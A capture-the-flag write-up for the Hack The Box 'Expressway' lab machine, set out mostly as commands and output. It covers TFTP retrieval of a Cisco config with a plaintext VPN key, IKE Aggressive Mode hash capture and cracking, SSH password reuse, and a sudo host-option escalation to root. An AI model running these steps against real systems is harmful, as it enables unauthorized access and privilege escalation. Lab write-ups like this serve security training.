# HTB Expressway - Writeup

**Machine:** Expressway  
**Difficulty:** Medium  


---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Cisco Configuration Analysis](#2-cisco-configuration-analysis)
3. [Capturing the PSK with Aggressive Mode](#3-capturing-the-psk-with-aggressive-mode)
4. [SSH Access](#4-ssh-access)
5. [Internal Enumeration](#5-internal-enumeration)
6. [Privilege Escalation](#6-privilege-escalation)
7. [Why Does This Work?](#7-why-does-this-work)
8. [Attack Path Diagram](#8-attack-path-diagram)

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
sudo nmap -sCV -sU <IP>
```

Key findings:

```text
22/tcp   open  ssh
69/udp   open|filtered tftp
```

Port `69/UDP` (TFTP) is the main initial access vector.

### 1.2 TFTP Enumeration

```bash
sudo nmap -sU -p69 --script tftp-enum <IP>
```

The script reveals a file named `ciscortr.cfg`, containing a Cisco IOS configuration.

Download it:

```bash
tftp <IP>
tftp> binary
tftp> get "ciscortr.cfg"
```

---

## 2. Cisco Configuration Analysis

The downloaded file is the router's `running-config`. Its hostname is `expressway`.

### 2.1 PSK in Plaintext

```text
crypto isakmp client configuration group rtr-remote
    key secret-password
```

- **Group ID:** `rtr-remote`
- **PSK:** `secret-password`

### 2.2 User Account

```text
username ike password *****
```

The user `ike` exists, but the password is masked.

### 2.3 VPN Peer

```text
crypto ipsec client ezvpn ezvpnclient
    connect auto
    group 2 key secret-password
    mode client
    peer <IP>
```

### 2.4 Additional Information

| Item | Value |
|---|---|
| Hostname | `expressway` |
| Domain | `expressway.htb` |
| WAN | `<IP>/24` |
| Internal networks | `<IP>/24`, `<IP>/24`, `<IP>/24` |
| Open Wi-Fi networks | `cisco`, `ciscowep`, `ciscowpa` |
| Password encryption | `no service password-encryption` |
| HTTP server | `ip http server` |

The `no service password-encryption` setting means passwords in the configuration are not encrypted by this Cisco configuration feature.

---

## 3. Capturing the PSK with Aggressive Mode

### 3.1 IKE Scan

```bash
sudo ike-scan <IP>
```

The response confirms:

- **Authentication:** PSK
- **Encryption:** 3DES
- **Hash:** MD5
- **Group:** 2

### 3.2 Aggressive Mode — Capturing the Hash

```bash
sudo ike-scan -A --id=ike@expressway.htb -P hashfile <IP>
```


### 3.3 Cracking the PSK

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hashfile
```

Result:

```text
key "freakingrockstarontheroad" matches SHA1 hash ...
```

Recovered PSK:

```text
freakingrockstarontheroad
```

**Note:** Use the hash captured from your own target and the wordlist available to you.

---

## 4. SSH Access

The recovered PSK is reused as the SSH password for the `ike` account.

```bash
ssh ike@<IP>
# Password: freakingrockstarontheroad
```

Check the user's identity and group membership:

```bash
id
```

Output:

```text
uid=1000(ike) gid=1000(ike) groups=1000(ike),13(proxy)
```

The `ike` user belongs to the `proxy` group. This becomes important during internal enumeration.

---

## 5. Internal Enumeration

### 5.1 Checking Listening Services

```bash
ss -tlnp
```

Only SSH (`22`) and a local SMTP service (`25`) are listening. No Squid service or web server is exposed in this output.

### 5.2 Finding Files Owned by the `proxy` Group

```bash
find / -group proxy 2>/dev/null
```

The results point to:

```text
/var/log/squid/
```

### 5.3 Analyzing Squid Logs

```bash
cat /var/log/squid/access.log.1
```

A key entry reveals an internal hostname:

```text
TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```

The hostname `offramp.expressway.htb` becomes relevant during privilege escalation.

---

## 6. Privilege Escalation

### 6.1 Checking Sudo Rules for `offramp`

Use `sudo -h` to check the sudo rules associated with the hostname found in the Squid logs:

```bash
sudo -h offramp.expressway.htb -l
```

Output:

```text
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
```

The output shows that `ike` may run any command as `root` without a password when the specified host context is used.

### 6.2 Obtaining Root

```bash
sudo -h offramp.expressway.htb /bin/bash
```

Verify the current user:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Root access has been obtained.

### 6.3 Reading the Flags

```bash
cat /root/root.txt
cat /home/ike/user.txt
```

---

## 7. Why Does This Work?

### 7.1 Why Does `ping offramp.expressway.htb` Fail?

`offramp.expressway.htb` is used as a hostname in the sudoers configuration, it does not necessarily represent a reachable network host.

The `-h` option tells `sudo` to evaluate rules defined for the specified host. Sudo reads the local `/etc/sudoers` configuration and matches the hostname against its rules. It does not need to establish a network connection or resolve the name through DNS.

### 7.2 Why Does `curl <IP>:80` Fail?

There is no HTTP service listening on the target. The `ss -tlnp` output showed only SSH and local SMTP.

`offramp.expressway.htb` is a separate internal hostname. The Squid log shows a request to that hostname being denied with HTTP `403`, while revealing the hostname itself.

### 7.3 Why Does `cat /etc/sudoers` Fail?

The `/etc/sudoers` file has restrictive permissions (`0440`, owned by `root:root`), so the `ike` user cannot read it directly.

However, `sudo -l` evaluates the sudoers rules with the privileges required to do so. Therefore, the rules can be enumerated through `sudo` without directly reading the file as `ike`.

---

## 8. Attack Path Diagram

```text
[TFTP 69/UDP]
      |
      v
[version 12.3.txt]
      |
      +----> PSK: secret-password
      |      Group: rtr-remote
      |      User: ike
      |
      v
[ike-scan -A]
      |
      v
[Captured PSK hash]
      |
      v
[psk-crack]
      |
      v
[freakingrockstarontheroad]
      |
      v
[SSH as ike]
      |
      v
[proxy group membership]
      |
      v
[/var/log/squid/access.log.1]
      |
      v
[offramp.expressway.htb]
      |
      v
[sudo -h offramp -l]
      |
      v
[(root) NOPASSWD: ALL]
      |
      v
[Root shell]
```

---

## Attack Chain Summary

```text
TFTP enumeration
    → Download Cisco running-config
    → Recover VPN group PSK and user information
    → Capture IKE Aggressive Mode hash
    → Crack PSK
    → Reuse password for SSH as ike
    → Enumerate proxy-group files
    → Discover internal hostname in Squid logs
    → Check host-specific sudo rules
    → Obtain root shell
```
